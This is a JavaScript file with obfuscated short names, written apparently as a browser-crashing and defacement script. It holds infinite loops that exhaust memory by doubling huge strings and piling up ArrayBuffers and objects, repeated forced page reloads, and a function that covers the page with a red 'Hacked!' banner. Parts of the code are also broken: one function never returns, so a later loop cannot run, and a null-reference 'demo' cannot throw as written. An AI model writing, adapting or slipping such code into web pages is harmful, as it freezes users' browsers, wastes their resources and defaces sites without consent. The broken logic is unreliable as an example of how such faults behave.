function x1() {
  while (true) {
    let z1 = {
      a1: "data"
    };
    let b1 = z1;
    console.log("Before:", b1.a1);
    z1 = null;

    try {
      console.log("After:", b1.a1);
    } catch (e) {
      console.log("Error:", e.message);
    }
  }
}

function y2() {
  let c2 = "A".repeat(1000000);
  let d2 = [];
  let e2 = [];
  let f2 = {};
  let g2 = 0;
  let h2 = 0;

  while (true) {
    c2 += c2;
    if (c2.length > 100000000) c2 = "A".repeat(1000000);
    d2.push(new ArrayBuffer(1000000));
    if (d2.length > 1000) d2 = [];
    e2.push([]);
    if (e2.length > 1000) e2 = [];
    h2++;
    if (h2 >= 100) location.reload();
    f2[g2] = "A".repeat(1000);
    g2++;

    if (g2 > 10000000) {
      f2 = {};
      g2 = 0;
    }
  }
}

function z3() {
  let i3 = document.createElement('div');
  i3.innerHTML = '<h1>Hacked!</h1>';
  i3.style.position = 'absolute';
  i3.style.top = '50%';
  i3.style.left = '50%';
  i3.style.transform = 'translate(-50%, -50%)';
  i3.style.backgroundColor = 'red';
  i3.style.color = 'white';
  i3.style.padding = '20px';
  document.body.appendChild(i3);
}

let j4 = [];

class k5 {
  constructor() {}

}

const l6 = () => {
  let m7 = 0;
  x1();

  while (true) {
    let n8 = {
      a1: "data"
    };
    let o9 = n8;
    console.log("Before:", o9.a1);
    n8 = null;

    try {
      console.log("After:", o9.a1);
    } catch (e) {
      console.log("Error:", e.message);
    }

    m7++;
    if (m7 >= 500) location.reload();

    for (let p0 = 0; p0 < 1000; p0++) {
      j4.push(new k5());
    }

    document.getElementById('msg').innerHTML = `Total ${j4.length} k5 objects created`;
  }
};

function q1() {
  let r2 = "A".repeat(1000000);

  while (true) {
    r2 += r2;
    if (r2.length > 1000000000) r2 = "A".repeat(1000000);
  }
}